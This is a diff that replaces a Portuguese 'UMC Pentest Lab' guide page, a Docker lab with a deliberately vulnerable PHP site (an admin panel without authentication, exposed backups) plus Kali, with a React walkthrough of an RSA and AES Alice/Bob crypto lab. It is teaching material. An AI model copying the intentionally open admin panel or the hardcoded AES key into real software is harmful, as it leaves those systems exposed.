@@ -1,638 +1,566 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UMC Pentest Lab — Guia Completo</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --bg:      #070a0f;
-    --surf:    #0d1219;
-    --card:    #111820;
-    --b1:      #1a2535;
-    --b2:      #243040;
-    --text:    #cdd9e5;
-    --muted:   #637083;
-    --dim:     #3d4f62;
-    --green:   #39d353;
-    --cyan:    #58d6e8;
-    --red:     #ff4d6a;
-    --orange:  #ff8c42;
-    --yellow:  #ffd166;
-    --blue:    #4d9fff;
-    --pr:      #39d353;
-  }
-  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-  body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;padding-bottom:80px;overflow-x:hidden}
-  body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px)}
+import { useState } from "react";
 
-  /* HERO */
-  .hero{position:relative;overflow:hidden;padding:52px 40px 44px;border-bottom:1px solid var(--b1);
-    background:radial-gradient(ellipse 90% 70% at 65% 0%,rgba(57,211,83,.08) 0%,transparent 60%),
-               radial-gradient(ellipse 50% 40% at 10% 100%,rgba(255,77,106,.06) 0%,transparent 55%), var(--bg)}
-  .hero-grid{position:absolute;inset:0;pointer-events:none;
-    background-image:linear-gradient(rgba(57,211,83,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(57,211,83,.04) 1px,transparent 1px);
-    background-size:44px 44px}
-  .scan{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(57,211,83,.5),transparent);animation:sc 5s linear infinite;pointer-events:none}
-  @keyframes sc{0%{top:-2px}100%{top:100%}}
-  .hero-inner{position:relative;max-width:940px;margin:0 auto}
-  .badge{display:inline-flex;align-items:center;gap:7px;background:rgba(57,211,83,.08);border:1px solid rgba(57,211,83,.22);
-    color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.68rem;padding:4px 13px;
-    border-radius:3px;letter-spacing:.12em;margin-bottom:18px;text-transform:uppercase}
-  .blink{animation:bl .8s step-end infinite}
-  @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
-  .hero h1{font-family:'Orbitron',sans-serif;font-size:clamp(1.5rem,4vw,2.8rem);font-weight:900;line-height:1.1;letter-spacing:.03em;margin-bottom:14px}
-  .hero h1 .g{color:var(--green)} .hero h1 .r{color:var(--red)}
-  .hero p{color:var(--muted);font-size:.97rem;max-width:580px;line-height:1.65}
-  .hero-stats{display:flex;gap:14px;flex-wrap:wrap;margin-top:26px}
-  .st{background:var(--surf);border:1px solid var(--b1);padding:9px 16px;border-radius:4px;display:flex;align-items:center;gap:9px;font-size:.8rem}
-  .st strong{color:var(--text);font-weight:600} .st span{color:var(--muted)}
+const SETUP = [
+  {
+    num: 1,
+    emoji: "📦",
+    titulo: "Pré-requisitos",
+    descricao: "Antes de começar, verifique se sua máquina possui Docker e Docker Compose instalados.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Verifique o Docker",
+        codigo: "docker --version\ndocker compose version",
+        esperado: "Docker version 24.x.x\nDocker Compose version v2.x.x",
+      },
+      {
+        tipo: "info",
+        texto: "Não tem Docker? Baixe em https://docs.docker.com/get-docker/ e instale antes de continuar.",
+      },
+    ],
+  },
+  {
+    num: 2,
+    emoji: "🗂️",
+    titulo: "Crie a estrutura de pastas",
+    descricao: "Crie manualmente a estrutura de diretórios do projeto no terminal.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Linux / macOS",
+        codigo: "mkdir -p crypto-lab/alice crypto-lab/bob\ncd crypto-lab",
+      },
+      {
+        tipo: "cmd",
+        label: "Windows (PowerShell)",
+        codigo: "New-Item -ItemType Directory -Force -Path crypto-lab\\alice, crypto-lab\\bob\ncd crypto-lab",
+      },
+      {
+        tipo: "info",
+        texto: "A estrutura final deve ser: crypto-lab/ ├── docker-compose.yml ├── alice/ │   ├── Dockerfile │   └── alice.py └── bob/     ├── Dockerfile     └── bob.py",
+      },
+    ],
+  },
+  {
+    num: 3,
+    emoji: "📄",
+    titulo: "Crie os arquivos do projeto",
+    descricao: "Cole o conteúdo de cada arquivo conforme fornecido no material da atividade. Use um editor como VS Code, Nano ou Notepad.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Abrir VS Code na pasta (opcional)",
+        codigo: "code .",
+      },
+      {
+        tipo: "aviso",
+        texto: "Atenção: o arquivo Dockerfile é o MESMO para alice/ e bob/. Copie-o para as duas pastas. Lembre de ajustar o CMD para alice.py ou bob.py em cada um.",
+      },
+    ],
+  },
+];
 
-  /* LAYOUT */
-  .wrap{max-width:940px;margin:0 auto;padding:0 24px}
+const ATO1 = [
+  {
+    num: 1,
+    emoji: "🚀",
+    titulo: "Suba os containers — Modo RSA",
+    descricao: "Execute o comando abaixo na raiz do projeto (pasta crypto-lab/). O Docker vai construir as imagens e iniciar Bob e Alice na rede interna.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Terminal — raiz do projeto",
+        codigo: "MODO=assimetrica docker-compose up --build",
+      },
+      {
+        tipo: "cmd",
+        label: "Windows (PowerShell)",
+        codigo: "$env:MODO=\"assimetrica\"; docker-compose up --build",
+      },
+      {
+        tipo: "info",
+        texto: "O flag --build força a reconstrução das imagens. Use-o sempre que editar um .py. Na primeira execução, o Docker vai baixar a imagem python:3.11-slim (~50 MB).",
+      },
+    ],
+  },
+  {
+    num: 2,
+    emoji: "⏳",
+    titulo: "Bob sobe e aguarda Alice",
+    descricao: "Bob é o servidor. Ele inicia primeiro (depends_on no docker-compose) e fica bloqueado aguardando uma conexão TCP na porta 9000.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container bob",
+        codigo: "=============================================\n  🐳 BOB — servidor criptográfico\n=============================================\n⏳ Aguardando Alice na porta 9000...",
+      },
+      {
+        tipo: "info",
+        texto: "Se Bob não aparecer, verifique se o Dockerfile de bob/ aponta para CMD [\"python\", \"-u\", \"bob.py\"].",
+      },
+    ],
+  },
+  {
+    num: 3,
+    emoji: "🔌",
+    titulo: "Alice conecta em Bob",
+    descricao: "Alice aguarda 1 segundo (time.sleep(1)) para Bob estar pronto, depois abre um socket TCP para o host 'bob' — que é resolvido internamente pelo Docker na rede crypto-net.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container alice",
+        codigo: "=============================================\n  🐳 ALICE — cliente criptográfico\n  Modo: ASSIMETRICA\n=============================================\n\n🔌 Conectando em Bob (bob:9000)...\n✅ Conectada!",
+      },
+      {
+        tipo: "output",
+        label: "Log esperado — container bob (após conexão)",
+        codigo: "🤝 Alice conectou! (172.18.0.x)",
+      },
+      {
+        tipo: "conceito",
+        label: "Como o Docker resolve o nome 'bob'?",
+        texto: "Na rede bridge do Docker, cada container pode se comunicar com outro pelo nome do serviço definido no docker-compose.yml. É um DNS interno. Por isso alice.py usa HOST = \"bob\" e não um IP.",
+      },
+    ],
+  },
+  {
+    num: 4,
+    emoji: "🔑",
+    titulo: "Bob gera o par de chaves RSA-2048",
+    descricao: "Bob gera uma chave privada (fica em memória, nunca sai do container) e uma chave pública (será enviada para Alice).",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container bob",
+        codigo: "🔑 [ATO 1] Modo ASSIMÉTRICO — RSA-OAEP\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚙️  Gerando par de chaves RSA-2048...",
+      },
+      {
+        tipo: "conceito",
+        label: "O que é RSA-2048?",
+        texto: "RSA é um algoritmo assimétrico. O número 2048 é o tamanho da chave em bits. Quanto maior, mais seguro — mas também mais lento. Para produção atual, recomenda-se 2048 ou 4096 bits.",
+      },
+    ],
+  },
+  {
+    num: 5,
+    emoji: "📤",
+    titulo: "Bob envia a chave pública para Alice",
+    descricao: "A chave pública é serializada no formato PEM e enviada pelo socket. Alice carrega o PEM e está pronta para cifrar.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container bob",
+        codigo: "📤 Chave pública enviada para Alice\n   (PEM, 451 bytes)",
+      },
+      {
+        tipo: "output",
+        label: "Log esperado — container alice",
+        codigo: "📥 Chave pública de Bob recebida!\n   (451 bytes de PEM)",
+      },
+      {
+        tipo: "info",
+        texto: "O formato PEM começa com -----BEGIN PUBLIC KEY----- e é legível em texto. Se quiser ver o conteúdo, adicione print(pub_pem.decode()) no bob.py.",
+      },
+    ],
+  },
+  {
+    num: 6,
+    emoji: "🔒",
+    titulo: "Alice cifra a mensagem com RSA-OAEP",
+    descricao: "Alice usa a chave pública recebida para cifrar a string. O resultado é um bloco de bytes aleatório — o ciphertext — que é enviado para Bob.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container alice",
+        codigo: "📝 Mensagem original: \"Olá Bob! Esta mensagem é secreta 🔒\"\n🔒 Cifrado (256 bytes):\n   a3f92c1d8b4e... (hex truncado)\n\n📤 Ciphertext enviado para Bob\n\n💡 Alice usou a chave PÚBLICA de Bob.\n   Somente Bob pode decifrar — com sua chave privada!",
+      },
+      {
+        tipo: "conceito",
+        label: "Por que o ciphertext muda a cada execução?",
+        texto: "O OAEP adiciona um padding aleatório antes de cifrar. Isso impede ataques de dicionário: mesmo cifrando a mesma mensagem duas vezes, os resultados são diferentes. É uma característica de segurança intencional.",
+      },
+    ],
+  },
+  {
+    num: 7,
+    emoji: "✅",
+    titulo: "Bob decifra com a chave privada",
+    descricao: "Bob usa sua chave privada (que nunca saiu do container) para decifrar o ciphertext e recuperar a mensagem original.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container bob",
+        codigo: "📥 Ciphertext recebido (256 bytes):\n   a3f92c1d8b4e... (hex truncado)\n\n✅ Mensagem decifrada com chave PRIVADA:\n   \"Olá Bob! Esta mensagem é secreta 🔒\"\n\n💡 Só Bob consegue decifrar — Alice nem mesmo conhece a chave privada!\n\n🏁 Comunicação encerrada.",
+      },
+    ],
+  },
+  {
+    num: 8,
+    emoji: "🧪",
+    titulo: "Desafio: tente quebrar a mensagem",
+    descricao: "Abra outro terminal e execute o Python localmente. Tente decifrar o ciphertext usando uma chave privada FALSA — o que acontece?",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Execute no terminal local (Python 3 instalado)",
+        codigo: "python3 -c \"\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives import hashes\n\n# Gera uma chave FALSA — não é a chave de Bob!\nfake_key = rsa.generate_private_key(65537, 2048)\n\nciphertext = bytes.fromhex('COLE_O_HEX_AQUI')\nfake_key.decrypt(ciphertext, padding.OAEP(\n    mgf=padding.MGF1(algorithm=hashes.SHA256()),\n    algorithm=hashes.SHA256(), label=None))\n\"",
+      },
+      {
+        tipo: "output",
+        label: "Resultado esperado",
+        codigo: "ValueError: Decryption failed.\n(ou: cryptography.exceptions.InvalidKey)",
+      },
+      {
+        tipo: "aviso",
+        texto: "Este é o ponto central da criptografia assimétrica: sem a chave privada correta de Bob, é matematicamente inviável decifrar — mesmo conhecendo o algoritmo e tendo o ciphertext.",
+      },
+    ],
+  },
+];
 
-  /* SECTION TITLE */
-  .sec{font-family:'Orbitron',sans-serif;font-size:.72rem;font-weight:700;letter-spacing:.2em;text-transform:uppercase;
-    color:var(--green);margin:44px 0 18px;display:flex;align-items:center;gap:12px}
-  .sec::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--b2),transparent)}
+const ATO2 = [
+  {
+    num: 1,
+    emoji: "🔄",
+    titulo: "Derrube os containers e reinicie no modo AES",
+    descricao: "Pare os containers do Ato 1 e suba novamente com a variável MODO=simetrica.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Passo 1 — derrubar",
+        codigo: "docker-compose down",
+      },
+      {
+        tipo: "cmd",
+        label: "Passo 2 — subir no modo simétrico (Linux/macOS)",
+        codigo: "MODO=simetrica docker-compose up --build",
+      },
+      {
+        tipo: "cmd",
+        label: "Passo 2 — subir no modo simétrico (Windows PowerShell)",
+        codigo: "$env:MODO=\"simetrica\"; docker-compose up --build",
+      },
+      {
+        tipo: "output",
+        label: "Confirmação — log de Alice",
+        codigo: "  Modo: SIMETRICA",
+      },
+    ],
+  },
+  {
+    num: 2,
+    emoji: "🔑",
+    titulo: "Observe a diferença: sem troca de chaves",
+    descricao: "Desta vez, NÃO há troca de chaves entre os containers. Ambos já possuem a mesma constante CHAVE_SIMETRICA definida no código.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log de Bob — modo simétrico",
+        codigo: "🔐 [ATO 2] Modo SIMÉTRICO — AES-256-GCM\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔑 Chave compartilhada: chave-super-secreta-32bytes!!!!!\n   (ambos já sabem a mesma chave!)",
+      },
+      {
+        tipo: "conceito",
+        label: "Por que 32 bytes?",
+        texto: "AES-256 exige uma chave de exatamente 256 bits = 32 bytes. Se usar 16 bytes, vira AES-128. A biblioteca cryptography valida o tamanho e lança erro se estiver incorreto.",
+      },
+    ],
+  },
+  {
+    num: 3,
+    emoji: "🎲",
+    titulo: "Alice gera o nonce e cifra",
+    descricao: "Alice gera 12 bytes aleatórios (nonce) a cada execução, cifra a mensagem com AES-256-GCM e envia nonce + ciphertext para Bob.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container alice",
+        codigo: "📝 Mensagem original: \"Olá Bob! Esta mensagem é secreta 🔒\"\n🔒 Cifrado (51 bytes):\n   nonce: 8f3a21c094b7e1d2a5f6c890\n   cipher: 3d7e9a1b4c2f...\n\n📤 Enviado para Bob\n\n💡 AES cifra E assina a mensagem (GCM = autenticado).\n   Bob detecta qualquer adulteração no ciphertext!",
+      },
+      {
+        tipo: "conceito",
+        label: "O que é o nonce?",
+        texto: "Nonce = Number used ONCE. É um valor aleatório que garante que dois textos idênticos gerem ciphertexts diferentes. No AES-GCM, o nonce tem 12 bytes (96 bits) e DEVE ser único para cada mensagem com a mesma chave.",
+      },
+    ],
+  },
+  {
+    num: 4,
+    emoji: "✅",
+    titulo: "Bob decifra com a chave simétrica",
+    descricao: "Bob usa o nonce recebido junto com a chave compartilhada para decifrar e autenticar a mensagem.",
+    blocos: [
+      {
+        tipo: "output",
+        label: "Log esperado — container bob",
+        codigo: "📥 Dados recebidos (51 bytes):\n   nonce: 8f3a21c094b7e1d2a5f6c890\n   cipher: 3d7e9a1b4c2f...\n\n✅ Mensagem decifrada com chave SIMÉTRICA:\n   \"Olá Bob! Esta mensagem é secreta 🔒\"\n\n💡 AES é muito mais rápido que RSA, por isso é usado após o handshake TLS!\n\n🏁 Comunicação encerrada.",
+      },
+    ],
+  },
+  {
+    num: 5,
+    emoji: "🧪",
+    titulo: "Desafio: adultere 1 byte do ciphertext",
+    descricao: "Edite bob.py para inverter o primeiro byte do ciphertext antes de decifrar. O AES-GCM deve detectar a adulteração e lançar erro.",
+    blocos: [
+      {
+        tipo: "cmd",
+        label: "Adicione esta linha em bob.py — antes do decrypt",
+        codigo: "# Logo após: nonce, ciphertext = dados[:12], dados[12:]\nciphertext = bytes([ciphertext[0] ^ 0xFF]) + ciphertext[1:]\nprint(\"⚠️  Ciphertext adulterado propositalmente!\")",
+      },
+      {
+        tipo: "cmd",
+        label: "Suba novamente",
+        codigo: "docker-compose down\nMODO=simetrica docker-compose up --build",
+      },
+      {
+        tipo: "output",
+        label: "Resultado esperado",
+        codigo: "⚠️  Ciphertext adulterado propositalmente!\ncryptography.exceptions.InvalidTag\n\n(Bob recusa a mensagem — integridade violada!)",
+      },
+      {
+        tipo: "aviso",
+        texto: "Isso é autenticação: o GCM gera uma tag criptográfica que cobre cada bit do ciphertext. Qualquer alteração, mesmo de 1 bit, invalida a tag e Bob rejeita a mensagem.",
+      },
+    ],
+  },
+  {
+    num: 6,
+    emoji: "💬",
+    titulo: "Reflexão final — conectando os dois atos",
+    descricao: "Você acabou de simular, na prática, os dois pilares da criptografia moderna. A questão é: como Alice e Bob combinariam a chave AES sem se encontrar pessoalmente?",
+    blocos: [
+      {
+        tipo: "conceito",
+        label: "A resposta: Diffie-Hellman + TLS",
+        texto: "No HTTPS, o servidor envia seu certificado (chave pública RSA/ECDSA). O cliente usa essa chave para negociar uma chave AES via Diffie-Hellman. Depois, toda a comunicação usa AES. O Ato 1 e o Ato 2 juntos formam exatamente o TLS handshake simplificado!",
+      },
+      {
+        tipo: "info",
+        texto: "Para explorar mais: pesquise 'TLS 1.3 handshake diagram' e identifique onde RSA e AES aparecem no fluxo.",
+      },
+    ],
+  },
+];
 
-  /* CARDS */
-  .blk{border:1px solid var(--b1);border-radius:8px;overflow:hidden;background:var(--card);margin-bottom:32px;transition:border-color .2s}
-  .blk:hover{border-color:rgba(57,211,83,.28)}
-  .blk-hdr{padding:20px 24px 16px;border-bottom:1px solid var(--b1);background:var(--surf);display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap}
-  .num{font-family:'Orbitron',sans-serif;font-size:.7rem;font-weight:700;color:var(--green);
-    background:rgba(57,211,83,.08);border:1px solid rgba(57,211,83,.22);padding:5px 11px;border-radius:3px;letter-spacing:.1em;flex-shrink:0;margin-top:2px}
-  .num.r{color:var(--red);background:rgba(255,77,106,.08);border-color:rgba(255,77,106,.22)}
-  .num.c{color:var(--cyan);background:rgba(88,214,232,.08);border-color:rgba(88,214,232,.22)}
-  .num.o{color:var(--orange);background:rgba(255,140,66,.08);border-color:rgba(255,140,66,.22)}
-  .blk-info{flex:1;min-width:180px}
-  .blk-info h2{font-size:1.1rem;font-weight:700;margin-bottom:5px}
-  .blk-info p{color:var(--muted);font-size:.86rem;line-height:1.5}
-  .tags{display:flex;flex-wrap:wrap;gap:5px;margin-top:9px}
-  .tag{font-family:'Share Tech Mono',monospace;font-size:.65rem;padding:2px 9px;border-radius:3px;letter-spacing:.04em}
-  .tg{background:rgba(57,211,83,.08);border:1px solid rgba(57,211,83,.18);color:var(--green)}
-  .tc{background:rgba(88,214,232,.08);border:1px solid rgba(88,214,232,.18);color:var(--cyan)}
-  .tr{background:rgba(255,77,106,.08);border:1px solid rgba(255,77,106,.18);color:var(--red)}
-  .to{background:rgba(255,140,66,.08);border:1px solid rgba(255,140,66,.18);color:var(--orange)}
-  .ty{background:rgba(255,209,102,.08);border:1px solid rgba(255,209,102,.18);color:var(--yellow)}
-  .tm{font-family:'Share Tech Mono',monospace;font-size:.7rem;padding:5px 13px;border-radius:20px;white-space:nowrap;align-self:flex-start;
-    background:rgba(57,211,83,.08);border:1px solid rgba(57,211,83,.2);color:var(--green)}
-  .blk-body{padding:24px}
+const TIPO_CORES = {
+  cmd:     { bg: "#0d1117", border: "#30363d", label: "#58a6ff" },
+  output:  { bg: "#0a1628", border: "#1f3a5f", label: "#79c0ff" },
+  info:    { bg: "var(--color-background-secondary)", border: "var(--color-border-info)", label: "#58a6ff" },
+  aviso:   { bg: "var(--color-background-secondary)", border: "#d29922", label: "#e3b341" },
+  conceito:{ bg: "var(--color-background-secondary)", border: "var(--color-border-tertiary)", label: "var(--color-text-secondary)" },
+};
 
-  /* OBJ */
-  .obj{background:rgba(88,214,232,.05);border:1px solid rgba(88,214,232,.14);border-left:3px solid var(--cyan);
-    border-radius:6px;padding:12px 16px;margin-bottom:22px;font-size:.86rem;line-height:1.6;color:#b8d4db}
-  .obj strong{color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:.68rem;letter-spacing:.1em;display:block;margin-bottom:3px}
+function Bloco({ b }) {
+  const [copiado, setCopiar] = useState(false);
+  const cores = TIPO_CORES[b.tipo] || TIPO_CORES.info;
 
-  /* STEP */
-  .step{margin-bottom:26px}
-  .shdr{display:flex;align-items:center;gap:9px;margin-bottom:9px}
-  .sn{font-family:'Share Tech Mono',monospace;font-size:.68rem;color:var(--green);
-    background:rgba(57,211,83,.08);border:1px solid rgba(57,211,83,.18);padding:2px 8px;border-radius:3px;flex-shrink:0}
-  .st2{font-weight:600;font-size:.93rem}
+  const copiar = () => {
+    navigator.clipboard.writeText(b.codigo || b.texto || "");
+    setCopiar(true);
+    setTimeout(() => setCopiar(false), 1500);
+  };
 
-  /* TERMINAL */
-  .term{background:#020609;border:1px solid var(--b2);border-radius:6px;overflow:hidden;
-    font-family:'Share Tech Mono',monospace;font-size:.79rem;margin-bottom:7px}
-  .tbar{background:#0d1219;border-bottom:1px solid var(--b1);padding:6px 13px;display:flex;align-items:center;gap:7px}
-  .dots{display:flex;gap:5px} .dot{width:9px;height:9px;border-radius:50%}
-  .dot.r{background:#ff5f57}.dot.y{background:#febc2e}.dot.g{background:#28c840}
-  .tbar span{color:var(--dim);font-size:.65rem;flex:1;text-align:center;letter-spacing:.07em}
-  .tbody{padding:14px 17px;display:flex;flex-direction:column;gap:11px}
-  .cb{display:flex;flex-direction:column;gap:3px}
-  .cl{display:flex;align-items:flex-start;gap:7px}
-  .pr2{color:var(--pr);user-select:none;flex-shrink:0;padding-top:1px}
-  .cm{color:#cdd9e5;line-height:1.5;word-break:break-all}
-  .cm .kw{color:var(--cyan)} .cm .sub{color:var(--green)} .cm .fl{color:var(--yellow)}
-  .cm .val{color:#89b4fa}    .cm .ip{color:var(--orange)}
-  .desc{color:var(--muted);font-size:.77rem;line-height:1.55;padding:7px 11px;
-    background:rgba(255,255,255,.02);border-radius:5px;border-left:2px solid var(--b2);margin-top:2px}
-  .desc .hi{color:var(--text);font-weight:600} .desc .g{color:var(--green);font-weight:600}
-  .desc .c{color:var(--cyan);font-weight:600}  .desc .o{color:var(--orange);font-weight:600}
-  .out{color:var(--dim);font-size:.75rem;line-height:1.5;padding-left:3px}
-  .out.g{color:#1f7a32} .out.r{color:#8a2030} .out.y{color:#8a6e20} .out.c{color:#2e7a87}
-
-  /* TIP / WARN */
-  .tip{background:rgba(255,209,102,.05);border:1px solid rgba(255,209,102,.17);border-left:3px solid var(--yellow);
-    border-radius:6px;padding:10px 14px;margin-top:11px;font-size:.8rem;color:#cfc090;line-height:1.55}
-  .tip strong{color:var(--yellow);font-family:'Share Tech Mono',monospace;font-size:.68rem;letter-spacing:.08em;display:block;margin-bottom:2px}
-  .warn{background:rgba(255,77,106,.05);border:1px solid rgba(255,77,106,.18);border-left:3px solid var(--red);
-    border-radius:6px;padding:10px 14px;margin-top:11px;font-size:.8rem;color:#d0a0a8;line-height:1.55}
-  .warn strong{color:var(--red);font-family:'Share Tech Mono',monospace;font-size:.68rem;letter-spacing:.08em;display:block;margin-bottom:2px}
-
-  hr.dv{border:none;border-top:1px solid var(--b1);margin:22px 0}
-
-  /* VULN MAP TABLE */
-  .vtable{width:100%;border-collapse:collapse;font-size:.79rem;margin-top:10px}
-  .vtable th{background:var(--surf);color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:.67rem;letter-spacing:.09em;
-    text-align:left;padding:9px 12px;border:1px solid var(--b2)}
-  .vtable td{padding:8px 12px;border:1px solid var(--b1);color:var(--muted);vertical-align:top;line-height:1.4}
-  .vtable tr:hover td{background:rgba(57,211,83,.03)}
-  .vtable td:first-child{font-family:'Share Tech Mono',monospace;color:var(--orange);font-weight:600}
-  .vtable td:nth-child(2){color:var(--text);font-weight:600}
-  .sv.c{color:var(--red);font-weight:700} .sv.h{color:var(--orange);font-weight:700}
-  .sv.m{color:var(--yellow)} .sv.l{color:var(--green)} .sv.i{color:var(--cyan)}
-  .path{font-family:'Share Tech Mono',monospace;font-size:.72rem;color:var(--blue)}
-
-  /* CHECKLIST */
-  .cll{list-style:none;display:flex;flex-direction:column;gap:7px;margin-top:10px}
-  .cll li{display:flex;align-items:flex-start;gap:9px;font-size:.85rem;color:var(--muted);line-height:1.5}
-  .cll li::before{content:'□';color:var(--b2);font-size:1rem;flex-shrink:0;margin-top:-1px;font-family:'Share Tech Mono',monospace}
-  .cll li span{color:var(--text)}
-
-  /* FOOTER */
-  .footer{margin-top:60px;text-align:center;padding-top:26px;border-top:1px solid var(--b1);
-    font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--dim)}
-  .footer span{color:var(--green)}
-
-  @media(max-width:600px){.hero{padding:36px 18px 30px}.blk-body,.blk-hdr{padding:16px}}
-</style>
-</head>
-<body>
-
-<!-- HERO -->
-<div class="hero">
-  <div class="hero-grid"></div><div class="scan"></div>
-  <div class="hero-inner">
-    <div class="badge"><span class="blink">▮</span> UMC LAB · PENTEST · AMBIENTE CONTROLADO</div>
-    <h1><span class="g">UMC Pentest Lab</span><br><span class="r">E.S-ADS</span> — Site Real + Kali + Compose</h1>
-    <p>Ambiente completo com site PHP vulnerável (cara da UMC), Kali Linux e Metasploitable2. Sobe tudo com <code style="color:var(--green);font-family:'Share Tech Mono',monospace">docker-compose up -d</code>.</p>
-    <div class="hero-stats">
-      <div class="st"><span>🐳</span><strong>3 containers</strong><span>orquestrados</span></div>
-      <div class="st"><span>🎯</span><strong>9 vulnerabilidades</strong><span>no site UMC</span></div>
-      <div class="st"><span>⏱</span><strong>~90 min</strong><span>duração</span></div>
-      <div class="st"><span>🌐</span><strong>localhost:8080</strong><span>alvo principal</span></div>
+  if (b.tipo === "info" || b.tipo === "aviso") return (
+    <div style={{
+      borderLeft: `3px solid ${cores.border}`,
+      background: cores.bg,
+      borderRadius: "0 8px 8px 0",
+      padding: "8px 12px",
+      fontSize: 13,
+      color: "var(--color-text-secondary)",
+      marginBottom: 10,
+      lineHeight: 1.6,
+    }}>
+      {b.tipo === "aviso" ? "⚠️ " : "ℹ️ "}{b.texto}
     </div>
-  </div>
-</div>
+  );
 
-<div class="wrap">
+  if (b.tipo === "conceito") return (
+    <div style={{
+      border: `1px solid ${cores.border}`,
+      background: cores.bg,
+      borderRadius: 8,
+      padding: "10px 14px",
+      marginBottom: 10,
+    }}>
+      <div style={{ fontSize: 12, fontWeight: 500, color: cores.label, marginBottom: 4 }}>📚 {b.label}</div>
+      <div style={{ fontSize: 13, color: "var(--color-text-primary)", lineHeight: 1.6 }}>{b.texto}</div>
+    </div>
+  );
 
-<!-- ══════ SETUP ══════ -->
-<div class="sec">FASE 0 — SETUP DO LABORATÓRIO</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num">SETUP</div>
-    <div class="blk-info">
-      <h2>Subir o lab completo com docker-compose</h2>
-      <p>Baixe o projeto e suba todos os containers com um único comando. O site PHP é buildado automaticamente.</p>
-      <div class="tags">
-        <span class="tag tg">docker-compose</span>
-        <span class="tag tc">build automático</span>
-        <span class="tag ty">rede isolada</span>
+  return (
+    <div style={{ marginBottom: 10 }}>
+      <div style={{
+        display: "flex", justifyContent: "space-between", alignItems: "center",
+        background: "#161b22", borderRadius: "8px 8px 0 0",
+        padding: "5px 12px", border: `1px solid ${cores.border}`, borderBottom: "none",
+      }}>
+        <span style={{ fontSize: 11, color: cores.label, fontWeight: 500 }}>
+          {b.tipo === "cmd" ? "$ " : ""}{b.label}
+        </span>
+        {b.codigo && (
+          <button onClick={copiar} style={{
+            background: "none", border: "none", cursor: "pointer",
+            fontSize: 11, color: "#8b949e", padding: "2px 6px",
+          }}>
+            {copiado ? "✓ copiado" : "copiar"}
+          </button>
+        )}
       </div>
+      <pre style={{
+        background: cores.bg,
+        border: `1px solid ${cores.border}`,
+        borderRadius: "0 0 8px 8px",
+        padding: "10px 14px",
+        fontSize: 12,
+        fontFamily: "monospace",
+        color: b.tipo === "output" ? "#79c0ff" : "#e6edf3",
+        overflowX: "auto",
+        margin: 0,
+        lineHeight: 1.65,
+        whiteSpace: "pre-wrap",
+        wordBreak: "break-all",
+      }}>{b.codigo}</pre>
     </div>
-    <div class="tm">⏱ 10 min</div>
-  </div>
-  <div class="blk-body">
-    <div class="obj">
-      <strong>🗂️ ESTRUTURA DO PROJETO</strong>
-      <code style="font-family:'Share Tech Mono',monospace;font-size:.8rem;color:var(--text);display:block;margin-top:6px;line-height:1.8">
-        umc-pentest-lab/<br>
-        ├── compose/docker-compose.yml   ← orquestrador<br>
-        ├── site/                        ← código do site vulnerável<br>
-        │   ├── Dockerfile<br>
-        │   ├── index.php, login.php, busca.php ...<br>
-        │   ├── admin/   ← painel sem autenticação<br>
-        │   └── backup/  ← arquivos sensíveis expostos
-      </code>
-    </div>
+  );
+}
 
-    <div class="step">
-      <div class="shdr"><div class="sn">0.1</div><div class="st2">Entrar na pasta e subir o lab</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>POWERSHELL — HOST</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">cd</span> <span class="val">C:\umc-pentest-lab\compose</span></span></div>
-            <div class="desc">Navega até a pasta onde está o docker-compose.yml.</div>
-          </div>
-          <div class="cb">
-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">docker-compose</span> <span class="sub">up</span> <span class="fl">-d</span> <span class="fl">--build</span></span></div>
-            <div class="desc">
-              <span class="g">up</span> cria e inicia todos os containers definidos no compose.<br>
-              <span class="c">-d</span> roda em background (detached).<br>
-              <span class="o">--build</span> força o build da imagem do site PHP antes de subir.
-            </div>
-          </div>
-          <div class="out c">Building alvo-umc-site ...</div>
-          <div class="out g">✔ Container alvo-umc-site     Started</div>
-          <div class="out g">✔ Container alvo-metasploitable Started</div>
-          <div class="out g">✔ Container kali-atacante      Started</div>
-          <div class="cb">
